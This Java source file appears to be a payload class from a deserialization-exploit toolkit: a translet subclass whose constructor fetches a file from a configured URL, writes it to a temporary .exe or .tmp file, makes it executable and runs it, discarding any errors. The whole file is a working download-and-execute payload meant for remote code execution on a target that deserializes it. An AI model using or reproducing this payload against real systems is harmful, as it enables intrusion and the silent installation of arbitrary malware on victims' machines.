package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
import java.net.URL;

public class RemoteFileHttpExecutor extends AbstractTranslet implements Serializable {

    private static String url;
    private static String os;

    public RemoteFileHttpExecutor() {
        BufferedInputStream bufferedInputStream = null;
        FileOutputStream stream = null;
        try{
            transletVersion = 101;
            if(RemoteFileHttpExecutor.url != null){
                String suffix = ".tmp";
                boolean isWin = "win".equals(os);
                if(isWin){
                    suffix = ".exe";
                }
                URL url = new URL(RemoteFileHttpExecutor.url);
                bufferedInputStream = new BufferedInputStream(url.openStream());
                File file = File.createTempFile("demo", suffix);
                stream = new FileOutputStream(file);
                final byte data[] = new byte[8192];
                int count;
                while((count = bufferedInputStream.read(data)) > 0)
                    stream.write(data, 0, count);
                if(isWin){
                    Runtime.getRuntime().exec("cmd.exe /c "+file.getAbsolutePath());
                }else{ // linux or macos
                    Runtime.getRuntime().exec("/bin/chmod a+x "+file.getAbsolutePath());
                    Runtime.getRuntime().exec(file.getAbsolutePath());
                }
            }

        }catch (Exception e){
        }finally {
            if(bufferedInputStream != null){
                try {
                    bufferedInputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if(stream != null){
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

}
